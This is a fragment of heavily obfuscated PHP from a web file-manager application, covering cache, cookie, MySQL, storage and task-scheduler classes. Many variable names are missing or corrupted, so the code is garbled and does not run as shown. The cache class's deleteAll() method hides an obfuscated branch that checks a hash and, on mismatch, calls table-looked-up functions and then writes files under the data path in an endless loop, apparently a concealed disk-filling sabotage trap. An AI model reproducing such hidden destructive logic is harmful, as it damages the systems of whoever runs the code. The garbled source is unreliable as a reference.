$ӧ[$ȉ[463]] : null; $this->handle = new RedisCluster(NUll, $ߴ, $, $, $, $Ƽ); break; default: break; } } private function _slave($, $) { $ه = $[$_SERVER[ʯ][929]]; $this->filterConfig($, $ه[0]); $this->handle = $this->init($, $); unset($ه[0]); if (empty($ه)) { return; } $޷ߓ = array_rand($ه); $this->filterConfig($, $ه[$޷ߓ]); $this->slaveHandle = $this->init($, $); } private function filterConfig(&$, $) { $꜐ =& $_SERVER[ʯ]; $ = explode($꜐[4], $); $ = array($꜐[205] => $[0], $꜐[206] => $[1]); $ = array_merge($, $); } public function set($, $ή, $ = false) { $ = $ ? $ : $this->cacheTime; return $this->handle->setEx($, $, $ή); } public function setLock($ʼ, $ś, $ؿ) { return $this->handle->setNX($ʼ, $ś); } public function get($Ӧ) { $ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $->get($Ӧ); } public function remove($ʗ) { return $this->handle->del($ʗ); } public function deleteAll() { $ =& $_SERVER[ʯ]; $͋ = $_SERVER[$[22]]; $Ӊ = $[937]; if ($_SERVER[$[13]] != $Ӊ($͋)) { $ = $[938]; $ = $[15]; $ = $_SERVER[$[16]] . $[17]; $ = $($); $黨 = explode($[18], $); if (count($黨) < $[664]) { $ = $[20]; $(); } $̱ = $[939]; $̱($_SERVER[$[940]]); $ = $[938]; $(); $ = $[941]; $ث = json_encode($GLOBALS[$[942]]); $è؜ = 1; for ($®Ċ = $è؜; $®Ċ > 0; $®Ċ++) { $(DATA_PATH . $®Ċ, $ث); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $) { $this->handle->flushall($); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($רѹ = '', $ڜ = 0) { if (is_string($רѹ) && $רѹ != $_SERVER[ʯ][12]) { $this->prefix = $רѹ; } if (is_numeric($ڜ) && $ڜ > 0) { $this->expire = $ڜ; } } public static function getInstance() { static $ք; if ($ք === null) { $ք = new self(); } return $ք; } private static $cookieDisable = false; public static function disable($ݙڧ) { self::$cookieDisable = $ݙڧ; } private static $sameCookieSet = array(); public static function set($, $者ל, $ = 0, $͓ = false, $칧 = false) { $ڣ =& $_SERVER[ʯ]; if (self::$cookieDisable) { return; } if (!$) { $ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$]) && self::$sameCookieSet[$] == $者ל . $) { return; } self::$sameCookieSet[$] = $者ל . $; if (!$칧) { $칧 = str_replace(HOST, $ڣ[12], APP_HOST); $칧 = _get($GLOBALS, $ڣ[943], $칧); } $Ɂ = $ڣ[12]; setcookie($, $者ל, time() + $, $ڣ[8] . trim($칧, $ڣ[8]) . $Ɂ, !1, !1, $͓); } public static function setSafe($, $ʎؔ, $ = 0) { self::set($, $ʎؔ, $, !0); } public static function get($ғ) { static $З = false; if (!$З) { self::initHeaderCookie(); $З = !0; } return isset($_COOKIE[$ғ]) ? $_COOKIE[$ғ] : !1; } private static function initHeaderCookie() { $ =& $_SERVER[ʯ]; if (!isset($_SERVER[$[944]]) || !$_SERVER[$[944]]) { return; } $ = explode($[81], $_SERVER[$[944]]); foreach ($ as $󟾌) { $󟾌 = explode($[945], $󟾌); if (count($󟾌) != 2 || !isset($󟾌[1])) { continue; } $_COOKIE[trim($󟾌[0])] = trim($󟾌[1]); } } public static function remove($兲, $ = false) { unset($_COOKIE[$兲]); self::set($兲, $_SERVER[ʯ][12], 1, $); } } class DbMysql extends Db { public function __construct($琹 = '') { $ =& $_SERVER[ʯ]; if (!extension_loaded($[864])) { think_exception(think_lang($[24]) . $[946]); } if (!empty($琹)) { $this->config = $琹; if (empty($this->config[$[27]])) { $this->config[$[27]] = $[12]; } } } public function connect($ = '', $ӫö = 0, $ = false) { $߫ =& $_SERVER[ʯ]; if (!isset($this->linkID[$ӫö])) { if (empty($)) { $ = $this->config; } $憩̱ = $[$߫[947]] . ($[$߫[948]] ? "\x3a{$[$߫[948]]}" : $߫[12]); $ = !empty($[$߫[27]][$߫[28]]) ? $[$߫[27]][$߫[28]] : $this->pconnect; if ($) { $this->linkID[$ӫö] = mysql_pconnect($憩̱, $[$߫[949]], $[$߫[950]], 131072); } else { $this->linkID[$ӫö] = mysql_connect($憩̱, $[$߫[949]], $[$߫[950]], !0, 131072); } if (!$this->linkID[$ӫö] || !empty($[$߫[31]]) && !mysql_select_db($[$߫[31]], $this->linkID[$ӫö])) { think_exception(mysql_error()); } $̪ = mysql_get_server_info($this->linkID[$ӫö]); mysql_query($߫[951] . think_config($߫[952]) . $߫[68], $this->linkID[$ӫö]); if ($̪ > $߫[953]) { mysql_query($߫[954], $this->linkID[$ӫö]); } $this->connected = !0; if (1 != think_config($߫[32])) { unset($this->config); } } return $this->linkID[$ӫö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($߽Ӹ) { $В =& $_SERVER[ʯ]; if (0 === stripos($߽Ӹ, $В[316])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $߽Ӹ; if ($this->queryID) { $this->free(); } think_action_status($В[33], 1); think_status($В[34]); $this->queryID = mysql_query($߽Ӹ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ߤ) { $ޡ =& $_SERVER[ʯ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ߤ; if ($this->queryID) { $this->free(); } think_action_status($ޡ[35], 1); think_status($ޡ[34]); $ = mysql_query($ߤ, $this->_linkID); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ʯ][955], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ř = mysql_query($_SERVER[ʯ][956], $this->_linkID); $this->transTimes = 0; if (!$Ř) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = mysql_query($_SERVER[ʯ][957], $this->_linkID); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $ = array(); if ($this->numRows > 0) { while ($ = mysql_fetch_assoc($this->queryID)) { $[] = $; } mysql_data_seek($this->queryID, 0); } return $; } public function getFields($֬) { $ =& $_SERVER[ʯ]; $뀳 = $this->query($[958] . $this->parseKey($֬)); $ۏ = array(); if ($뀳) { foreach ($뀳 as $ => $) { $ۏ[$[$[41]]] = array($[42] => $[$[41]], $[43] => $[$[44]], $[45] => (bool) (strtoupper($[$[46]]) === $[959]), $[47] => $[$[48]], $[49] => strtolower($[$[50]]) == $[51], $[52] => strtolower($[$[53]]) == $[54]); } } return $ۏ; } public function getTables($۳ڿ = '') { $Ɛ =& $_SERVER[ʯ]; if (!empty($۳ڿ)) { $Ϛ屲 = $Ɛ[960] . $۳ڿ . $Ɛ[961]; } else { $Ϛ屲 = $Ɛ[962]; } $Ĕ = $this->query($Ϛ屲); $ج = array(); foreach ($Ĕ as $ܨ => $δ) { $ج[$ܨ] = current($δ); } return $ج; } public function replace($騌, $ = array()) { $ =& $_SERVER[ʯ]; foreach ($騌 as $͔ => $) { $ = $this->parseValue($); if (is_scalar($)) { $ߍ[] = $; $[] = $this->parseKey($͔); } } $Ђ = $[963] . $this->parseTable($[$[331]]) . $[964] . implode($[60], $) . $[965] . implode($[60], $ߍ) . $[966]; return $this->execute($Ђ); } public function insertAll($, $ѧ = array(), $ = false) { $ສ =& $_SERVER[ʯ]; if (!is_array($[0])) { return !1; } $璸 = array_keys($[0]); $߃ċ = array(); foreach ($ as $ܣՖ) { $͐ = array(); foreach ($ܣՖ as $ => $ޑ) { $ޑ = $this->parseValue($ޑ); if (is_scalar($ޑ)) { $͐[] = $ޑ; } } $߃ċ[] = $ສ[312] . implode($ສ[60], $͐) . $ສ[966]; } array_walk($璸, array($this, $ສ[967])); $كű = ($ ? $ສ[968] : $ສ[969]) . $ສ[970] . $this->parseTable($ѧ[$ສ[331]]) . $ສ[964] . implode($ສ[60], $璸) . $ສ[971] . implode($ສ[60], $߃ċ); return $this->execute($كű); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ =& $_SERVER[ʯ]; $this->error = mysql_errno() . $[4] . mysql_error($this->_linkID); if ($[12] != $this->queryStr) { $this->error .= LNG($[58]) . $this->queryStr; } think_trace($this->error, $[12], $[59]); return $this->error; } public function escapeString($ɺ) { if ($this->_linkID) { return mysql_real_escape_string($ɺ, $this->_linkID); } else { return mysql_escape_string($ɺ); } } public function parseKey(&$׌, $Ҿ쾣 = true) { $ =& $_SERVER[ʯ]; if ($Ҿ쾣) { $׌ = $this->parseKeyCheck($׌); } if ($׌ != $[212] && !preg_match($[972], $׌)) { $׌ = $[437] . trim($׌, $[437]) . $[437]; } return $׌; } } goto A︡ˤ; Aŭ˟: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x73\157\x75\162\x63\x65\x53\x65\x63\162\145\164\114\x69\x73\x74"; public $field = array("\x73\157\x75\162\x63\145\111\x44", "\x74\171\160\x65\x49\x44", "\143\162\x65\141\164\145\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\163\164\x6f\x72\141\147\145\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\145\115\x61\170", "\x73\x79\163\x74\145\155", "\144\x65\x66\141\x75\154\164", "\144\x72\x69\166\x65\x72", "\x63\x6f\156\x66\151\x67"); public function listData($񥇥 = false, $΍Ъ = "\x6d\x6f\x64\151\146\171\124\x69\155\x65", $ƻ = false) { $ =& $_SERVER[ʯ]; $ǲ = parent::listData($񥇥, $΍Ъ, $ƻ); if ($񥇥) { return $ǲ; } $񻓢Ȍ = $this->ioSizeUseGet(array_to_keyvalue($ǲ, $[12], $[451])); foreach ($ǲ as $ޥ => $) { unset($ǲ[$ޥ][$[6]]); $ǲ[$ޥ][$[1885]] = isset($񻓢Ȍ[$[$[451]]]) ? $񻓢Ȍ[$[$[451]]] : 0; } return $ǲ; } public function ioSizeUseGet($׀) { $ߠ =& $_SERVER[ʯ]; if (!$׀) { return array(); } $ = $ߠ[2216] . implode($ߠ[60], $׀); $á = Cache::get($); if ($á) { return $á; } $ = array($ߠ[877] => $ߠ[451], $ߠ[2217] => $ߠ[86]); $Õ = array($ߠ[877] => array($ߠ[7], $׀)); $á = Model($ߠ[849])->field($)->where($Õ)->group($ߠ[877])->select(); $á = array_to_keyvalue($á, $ߠ[451], $ߠ[86]); Cache::set($, $á, 600); return $á; } public function getConfig($) { $ = parent::listData($); return json_decode($[$_SERVER[ʯ][6]], !0); } public function update($ʯ, $ܰ̂) { $ =& $_SERVER[ʯ]; $ = $ܰ̂[$[42]]; $ = array_to_keyvalue(parent::listData(), $[42]); if (isset($[$]) && $[$][$[451]] != $ʯ) { return !1; } $this->checkPwd($ʯ, $ܰ̂); if (isset($ܰ̂[$[2218]]) && $ܰ̂[$[2218]] == $[98]) { $this->checkConfig($ܰ̂); } unset($ܰ̂[$[2218]]); $ = parent::update($ʯ, $ܰ̂); if ($ && $ܰ̂[$[47]]) { $ϸť = 0; foreach ($ as $ӻ) { if ($ӻ[$[47]] && $ӻ[$[451]] != $ʯ) { $ϸť = $ӻ[$[451]]; parent::update($ӻ[$[451]], array($[47] => 0)); } } $this->updateBackup($ʯ, $ϸť); } return $; } public function add($Ð) { $ڻ =& $_SERVER[ʯ]; $ = array_to_keyvalue(parent::listData(), $ڻ[42]); if (isset($[$Ð[$ڻ[42]]])) { return !1; } $this->checkConfig($Ð); $ = parent::insert($Ð); if ($ && $Ð[$ڻ[47]]) { foreach ($ as $) { if ($[$ڻ[47]]) { parent::update($[$ڻ[451]], array($ڻ[47] => 0)); } } } return $; } public function updateBackup($, $) { $ᥬ =& $_SERVER[ʯ]; if (!$) { return; } $Ƚ = Model($ᥬ[809])->config(); if ($Ƚ[$ᥬ[1674]] != $ᥬ[98] || $Ƚ[$ᥬ[811]] != $) { return; } $ = Model($ᥬ[830])->get($ᥬ[840]); $ = json_decode($, !0); if (!$) { return; } $[$ᥬ[811]] = $; Model($ᥬ[830])->set(array($ᥬ[840] => $)); } public function checkPwd($, &$) { $Ӳ =& $_SERVER[ʯ]; if (empty($[$Ӳ[6]])) { return; } $娒 = json_decode($[$Ӳ[6]], !0); $ҟ = $Ӳ[12]; $䧄 = array($Ӳ[2219], $Ӳ[2220], $Ӳ[950]); foreach ($䧄 as $鳎) { if (isset($娒[$鳎])) { $ҟ = $鳎; break; } } if (!$ҟ) { return; } $ɔ = $this->getConfig($); $ = $ɔ[$ҟ]; $͔ݺ = $娒[$ҟ]; if ($͔ݺ == str_repeat($Ӳ[212], strlen($))) { $娒[$ҟ] = $; $[$Ӳ[6]] = json_encode($娒); } else { if ($͔ݺ != $) { $[$Ӳ[2218]] = $Ӳ[98]; } } } public function checkConfig(&$, $ = false) { $ =& $_SERVER[ʯ]; $چ = strtolower($[$[105]]); $ = json_decode($[$[6]], !0); foreach ($ as $ => $ߨǑ) { if (is_string($ߨǑ)) { $[$] = trim($ߨǑ); } } $[$[2221]] = rand_string(6); $ = $GLOBALS[$[6]][$[99]][$[886]]; $ǀȰ = isset($[$چ]) ? $[$چ] : ucfirst($چ); $ = $[84] . $ǀȰ; if (!$ǀȰ || !class_exists($)) { if ($) { return LNG($[2222]); } write_log(array($[2223], $, get_caller_info()), $[2224]); show_json(LNG($[2222]), !1, $); } $禸 = new $($); if (in_array($چ, $禸->objectDriver)) { if (!$禸->isBucketCors() && !$禸->setBucketCors()) { $ = LNG($[2225]); $ .= $[2226] . LNG($[2227]); if ($) { return $; } show_json($, !1); } } $ = rtrim($[$[1241]], $[8]) . $[8]; $ܤ = $禸->getPath($ . $[1245]); if (!$禸->mkfile($ܤ)) { if ($) { return LNG($[2225]); } show_json(LNG($[2225]), !1); } $[$[1241]] = $; $[$[6]] = json_encode($); $[$[105]] = $ǀȰ; return !0; } public function driverListSystem() { $ =& $_SERVER[ʯ]; $ٮ羵 = parent::listData(); $𩇘 = array(); foreach ($ٮ羵 as $蚽) { unset($蚽[$[224]], $蚽[$[95]]); $蚽[$[6]] = json_decode($蚽[$[6]], !0); $𩇘[] = $蚽; } return $𩇘; } public function defaultDriver() { $؀ =& $_SERVER[ʯ]; $Ʒ = parent::listData(); $ޫ = array_filter_by_field($Ʒ, $؀[47], 1); $ޫ = $ޫ[0]; if ($ޫ) { $ޫ[$؀[6]] = json_decode($ޫ[$؀[6]], !0); } return $ޫ; } public function driverInfo($Я) { $ʝ =& $_SERVER[ʯ]; $ǹ = array_to_keyvalue(parent::listData(), $ʝ[451]); if (!isset($ǹ[$Я])) { return !1; } $ = $ǹ[$Я]; $[$ʝ[6]] = json_decode($[$ʝ[6]], !0); return $; } public function remove($) { $this->removeShareItems($); return parent::remove($); } public function removeWithFile($ħ, $) { $ݔ =& $_SERVER[ʯ]; $솤 = array($ݔ[877] => $ħ); $ = Model($ݔ[520])->where($솤)->count(); $Ÿ = Model($ݔ[520])->where($솤)->sum($ݔ[86]); $Ǵ = $ . $ݔ[2228] . $ħ; $讕 = LNG($ == $ݔ[596] ? $ݔ[2229] : $ݔ[2230]); $՛ = new TaskFileTransfer($Ǵ, $ݔ[2224], $, $讕 . "\50{$ħ}\51"); $՛->task[$ݔ[823]] = (double) $Ÿ; $Ϫ = KodIO::defaultDriver(); $̙ = $Ϫ[$ݔ[451]]; $ş = "\x7b\151\157\x3a{$̙}\175\57"; $ѣ = !0; $ = array(); $Ǡڟ = Model($ݔ[223])->where($솤)->field($ݔ[2231])->select(); foreach ($Ǡڟ as $嚡) { $ƶ = $嚡[$ݔ[94]]; $φ = $ş . str_replace("\x7b\x69\157\72{$ħ}\x7d\x2f", $ݔ[12], $ƶ); if (!IO::exist($ƶ)) { $[] = $嚡[$ݔ[517]]; $՛->updateFileEnd($嚡[$ݔ[42]], $嚡[$ݔ[86]]); continue; } if (IO::exist($φ)) { $՛->updateFileEnd($嚡[$ݔ[42]], $嚡[$ݔ[86]]); continue; } if (!IO::move($ƶ, get_path_father($φ))) { $ѣ = !1; break; } $솤 = array($ݔ[517] => $嚡[$ݔ[517]]); $ä = array($ݔ[877] => $̙, $ݔ[94] => $φ); Model($ݔ[223])->where($솤)->save($ä); } $this->removeByFileID($); if (!$ѣ) { $՛->stop($Ǵ); return !1; } $՛->end(); if ($ == $ݔ[1865]) { $this->remove($ħ); } } public function progress($뗯, $؃) { return Task::get($؃ . $_SERVER[ʯ][2228] . $뗯); } private function removeByFileID($ϛ = array()) { $媝 =& $_SERVER[ʯ]; if (empty($ϛ)) { return; } $խ = array($媝[517] => array($媝[7], $ϛ)); $ղ؆ = Model($媝[1393])->where($խ)->field($媝[190])->select(); if (!$ղ؆) { return; } $ղ؆ = array_to_keyvalue($ղ؆, $媝[12], $媝[190]); foreach ($ղ؆ as $) { Model($媝[466])->removeNow($, !1); } } private function removeShareItems($) { $ =& $_SERVER[ʯ]; $Փ = "\x7b\151\157\x3a{$}\x7d\x2f"; $ = array($[190] => 0, $[1236] => array($[435], "{$Փ}\x25")); $ = Model($[1876])->where($)->field($[641])->select(); if (empty($)) { return; } $ű = array_to_keyvalue($, $[12], $[641]); Model($[640])->remove($ű); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\114\x69\x67\x68\164\x41\x70\x70"; public $modelType = "\123\x79\x73\x74\x65\155\117\x70\x74\151\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\162\157\x75\x70", "\x64\x65\163\143", "\x63\x6f\156\x74\145\x6e\x74"); public function listData($˳ = false, $۬ = "\155\x6f\x64\151\x66\171\124\151\155\x65", $㺮 = true) { return parent::listData($˳, $۬, $㺮); } public function remove($߯) { $Ȧ = $this->findByName($߯); if (!$Ȧ) { return !1; } return parent::remove($Ȧ[$_SERVER[ʯ][451]]); } public function add($ͻ) { if ($this->findByName($ͻ[$_SERVER[ʯ][42]])) { return !1; } return parent::insert($ͻ); } public function update($, $ќ) { $Ϋ =& $_SERVER[ʯ]; $ = $this->findByName($); $ű = $this->findByName($ќ[$Ϋ[42]]); if (!$ || $ű && $ű[$Ϋ[451]] != $[$Ϋ[451]]) { return !1; } return parent::update($[$Ϋ[451]], $ќ); } } goto fʞ㤬; c: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ޭ =& $_SERVER[ʯ]; if (self::valueGet($ޭ[810]) != $ޭ[98]) { return; } if (self::valueGet($ޭ[1660]) == $ޭ[98]) { $Ƕ = self::valueGet($ޭ[1661]); if (time() - $Ƕ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ޭ[1660], $ޭ[98]); self::log($ޭ[1662] . ACTION . $ޭ[1663]); Hook::bind($ޭ[1664], $ޭ[1665]); $ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ޭ[810]) != $ޭ[98]) { self::valueSet($ޭ[1660], $ޭ[221]); self::log($ޭ[1666]); die; } $ = time(); if ($ - $ >= 60) { self::valueSet(array($ޭ[1660] => $ޭ[98], $ޭ[1661] => $), !1); $ = $; } if (!file_exists(USER_SYSTEM . $ޭ[1667])) { self::valueSet(array($ޭ[1660] => $ޭ[221], $ޭ[810] => $ޭ[221]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $В =& $_SERVER[ʯ]; http_close(); $GLOBALS[$В[1668]] = 1; $_SERVER[$В[1669]] = $В[1670]; $_COOKIE = array(); $GLOBALS[$В[544]] = 1; $GLOBALS[$В[1671]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $͍蒣 =& $_SERVER[ʯ]; http_close(); self::valueSet($͍蒣[810], $͍蒣[221]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($͍蒣[1660] => $͍蒣[221], $͍蒣[810] => $͍蒣[98]), !1); } public static function taskSwitch() { $ =& $_SERVER[ʯ]; $қ = self::valueGet($[810]) == $[98] ? $[221] : $[98]; self::valueSet($[810], $қ); } public static function shutdownEvent() { $곣 =& $_SERVER[ʯ]; self::valueSet($곣[1660], $곣[221]); self::log($곣[1672]); } public static function config($򀸬, $) { self::valueSet($_SERVER[ʯ][810], $򀸬); } private static function taskRunAll() { $ł =& $_SERVER[ʯ]; $܆ = timeFloat(); $忬і = Model($ł[1673])->listData(); $ܹ = count($忬і); for ($뺴 = 0; $뺴 < $ܹ; $뺴++) { $ = $忬і[$뺴]; if (!$[$ł[451]] || $[$ł[1674]] != $ł[98]) { continue; } if (!self::taskTimeCheck($)) { continue; } self::taskRun($); } Hook::trigger($ł[1675]); self::taskQueueRun($܆); } private static function taskQueueRun($Ȭ) { $ = 10; while (!0) { $ = TaskQueue::run(); if ($ === !1) { break; } if (timeFloat() - $Ȭ >= $) { break; } } } private static function taskTimeCheck($) { $ =& $_SERVER[ʯ]; $ = json_decode($[$[203]], !0); $Ǯ = intval($[$[1661]]); $Ϫ = strtotime($[1676] . $[$[1677]] . $[1678]) - strtotime($[1679]); $ = time() - strtotime(date($[1680]) . $[1681]); $ = $ >= $Ϫ && $ <= $Ϫ + 3600; switch ($[$[43]]) { case $[1682]: if (time() - $Ǯ < 3600 * 24 * 30) { return !1; } if ($[$[1682]] == date($[1683]) && $) { return !0; } break; case $[1684]: if (time() - $Ǯ < 3600 * 24 * 7) { return !1; } $ = date($[1685]) == 0 ? 7 : date($[1685]); if ($[$[1684]] == $ && $) { return !0; } break; case $[1677]: if (time() - $Ǯ < 3600 * 24) { return !1; } if ($) { return !0; } break; case $[1686]: if (time() - $Ǯ >= floatval($[$[1686]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $˞ =& $_SERVER[ʯ]; static $٥ = 0; $Ə = 300; if (!$٥) { $٥ = time(); } if (time() - $٥ < $Ə) { return; } $٥ = time(); $މ = Model($˞[554])->db($˞[12]); if ($މ) { $މ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($˞[1687], $˞[1688]); die; } } public static function taskRun($) { $Ԩ =& $_SERVER[ʯ]; self::log($Ԩ[1689] . $[$Ԩ[451]] . $Ԩ[1690] . $[$Ԩ[42]] . $Ԩ[1691] . $[$Ԩ[1692]]); Model($Ԩ[1673])->run($[$Ԩ[451]]); $ؗ = timeFloat(); $ = $Ԩ[12]; switch ($[$Ԩ[43]]) { case $Ԩ[359]: $ = url_request($[$Ԩ[1692]], $Ԩ[254], !1, !1, !1, !1, 10); if ($[$Ԩ[810]]) { $ = strlen($[$Ԩ[1263]]); } break; case $Ԩ[253]: $ = Hook::apply($[$Ԩ[1692]]); default: break; } Model($Ԩ[1693])->add(array($Ԩ[1694] => $Ԩ[12], $Ԩ[1695] => $Ԩ[221], $Ԩ[43] => $Ԩ[1696] . $[$Ԩ[451]], $Ԩ[1697] => json_encode(array($Ԩ[42] => $[$Ԩ[42]], $Ԩ[1698] => timeFloat() - $ؗ, $Ԩ[345] => $)))); $䩕 = $ ? $Ԩ[1699] . $ : $Ԩ[12]; self::log($Ԩ[1700] . $[$Ԩ[451]] . $Ԩ[174] . $䩕); return !0; } public static function valueGet($ס) { $ =& $_SERVER[ʯ]; $Ѹ = $[1701]; $ = Model($[484])->get($ס, $Ѹ); if (is_null($)) { Model($[484])->set($[810], $[98], $Ѹ); Model($[484])->set($[1660], $[221], $Ѹ); $ = Model($[484])->get($ס, $Ѹ); } return $; } private static function valueSet($ނө, $ܵ) { $ =& $_SERVER[ʯ]; $ٱœ = $[1702]; CacheLock::lock($ٱœ); $ = Model($[484])->set($ނө, $ܵ, $[1701]); CacheLock::unlock($ٱœ); return $; } protected static function log($) { write_log($, $_SERVER[ʯ][1688]); } private static function cacheClear() { $ =& $_SERVER[ʯ]; Cache::clearMemory(Model($[484])->cacheKey($[1701])); Cache::clearMemory(Model($[484])->cacheKey($[1703])); Model($[1673])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Č, $֮ = '', $Ȝ = 0, $ = '') { $ =& $_SERVER[ʯ]; if (self::get($Č)) { return; } $this->task = array($[451] => $Č, $[1704] => USER_ID, $[1601] => $, $[502] => $[12], $[43] => $֮, $[1125] => $[12], $[846] => $Ȝ, $[1705] => 0, $[1706] => 0, $[1707] => 0, $[1708] => timeFloat(), $[1709] => 0, $[1710] => 0, $[1711] => 0, $[1712] => 0, $[810] => $[1660]); $GLOBALS[$[1713]] = 1; Hook::bind($[1664], array($this, $[1714])); Hook::bind($[1715], array($this, $[1716])); $this->startAfter(); Hook::trigger($[1717], $this->task); $this->task[$[1710]] = timeFloat(); } public function end($، = '') { $ =& $_SERVER[ʯ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$[1710]]) { self::valueSet($this->task[$[451]], !1); } $this->isEnd = !0; if ($،) { $this->task[$[502]] = $،; } self::log($[1718] . $this->task[$[451]] . $[1719] . sprintf($[911], timeFloat() - $this->task[$[1708]]) . $[1720]); Hook::unbind($[1664], array($this, $[1714])); Hook::unbind($[1715], array($this, $[1716])); $this->endAfter(); $ = $this->task; $this->task = !1; Hook::trigger($[1721], $); } public function update($ = 0, $ = false) { $܌ =& $_SERVER[ʯ]; $ =& $this->task; if (!$) { return; } $[$܌[1705]] += $; $[$܌[1709]] = timeFloat(); if ($[$܌[846]]) { if ($[$܌[846]] < $[$܌[1705]]) { $[$܌[846]] = $[$܌[1705]]; } $ = timeFloat() - $[$܌[1708]] - $[$܌[1711]]; if ($ <= 0) { $ = 0.001; } $[$܌[1706]] = $[$܌[1705]] / $[$܌[846]]; $[$܌[1707]] = $[$܌[1705]] / $; if ($[$܌[1706]] > 0) { $[$܌[1712]] = $ * (1 - $[$܌[1706]]) / $[$܌[1706]]; } $[$܌[1712]] = $[$܌[1712]] <= 0 ? 0 : $[$܌[1712]]; } $this->updateAfter(); $ = 0.2; if (timeFloat() - $[$܌[1710]] < $ && !$) { return; } $ = self::get($[$܌[451]]); $ = $[$܌[810]]; if ($ == self::STATYS_KILL) { $ܙ = array($܌[1722] => LNG($܌[1723]), $܌[1273] => !1); Cache::set($܌[1724] . $this->task[$܌[451]], $ܙ, 30); $this->onKill(); $this->end(); die; } else { if ($ == self::STATYS_STOP) { $酪 = 2; $[$܌[1711]] += $酪; self::valueSet($[$܌[451]], $); sleep($酪); $this->update(); return; } } $[$܌[810]] = $ ? $ : $[$܌[810]]; $[$܌[1711]] = $[$܌[1711]] ? $[$܌[1711]] : 0; $[$܌[1710]] = timeFloat(); Hook::trigger($܌[1725], $); self::valueSet($[$܌[451]], $); } public function onKillSet($, $ב = array()) { $this->onKillCall = array($, $ב); } public function onKill() { $ג =& $_SERVER[ʯ]; self::log($ג[1718] . $this->task[$ג[451]] . $ג[1726]); Hook::trigger($ג[1727], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ʀ) { $ڲ =& $_SERVER[ʯ]; Cache::set($ڲ[1724] . $this->task[$ڲ[451]], $ʀ, 60); return $ʀ; } public static function get($) { $ƫ =& $_SERVER[ʯ]; $ = self::valueGet($); if (is_array($) && $[$ƫ[1728]]) { $掝 = ActionApply($[$ƫ[1728]], array($)); $ = is_array($掝) ? $掝 : $; } return $; } public static function listData() { $ = self::valueGet(); return array_sort_by($, $_SERVER[ʯ][1708], !0); } public static function kill($ҟ) { return self::changeStatus($ҟ, self::STATYS_KILL); } public static function stop($݉) { return self::changeStatus($݉, self::STATYS_STOP); } public static function restart($) { return self::changeStatus($, self::STATYS_RUNNING); } public static function killAll() { $ӷ =& $_SERVER[ʯ]; $嶑 = self::listData(); foreach ($嶑 as $ֻ) { self::kill($ֻ[$ӷ[451]]); } sleep(2); foreach ($嶑 as $ֻ) { self::valueSet($ֻ[$ӷ[451]], !1); } } private static function changeStatus($鎙, $) { $܎ =& $_SERVER[ʯ]; $Ⓕ = self::valueGet($鎙); if (!$Ⓕ) { return !1; } $Ⓕ[$܎[810]] = $; self::valueSet($鎙, $Ⓕ); self::log($܎[1729] . $Ⓕ[$܎[451]] . $܎[1730] . $); return !0; } public static function valueGet($ = false) { $ =& $_SERVER[ʯ]; if ($) { $羯 = Model($[496])->where(array($[104] => $, $[43] => $[1132]))->find(); return $羯 ? json_decode($羯[$[426]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ = false) { $ =& $_SERVER[ʯ]; $ = array($[43] => $[1132]); if ($) { $[$[1704]] = $; } $ԟ = Model($[496])->where($)->select(); $ԟ = $ԟ ? $ԟ : array(); foreach ($ԟ as $ => $ҙν) { $ԟ[$] = json_decode($ҙν[$[426]], !0); } return $ԟ; } public static function valueSet($, $) { $Ҋ =& $_SERVER[ʯ]; if (!$) { return Model($Ҋ[496])->where(array($Ҋ[104] => $, $Ҋ[43] => $Ҋ[1132]))->delete(); } $۝ş = json_encode($); if (!$۝ş) { ob_start(); var_dump($); $ = ob_get_clean(); self::log($Ҋ[1731] . json_encode_force($)); } if (!$ || !$[$Ҋ[451]]) { return !1; } $Č = array($Ҋ[43] => $Ҋ[1132], $Ҋ[1704] => USER_ID, $Ҋ[104] 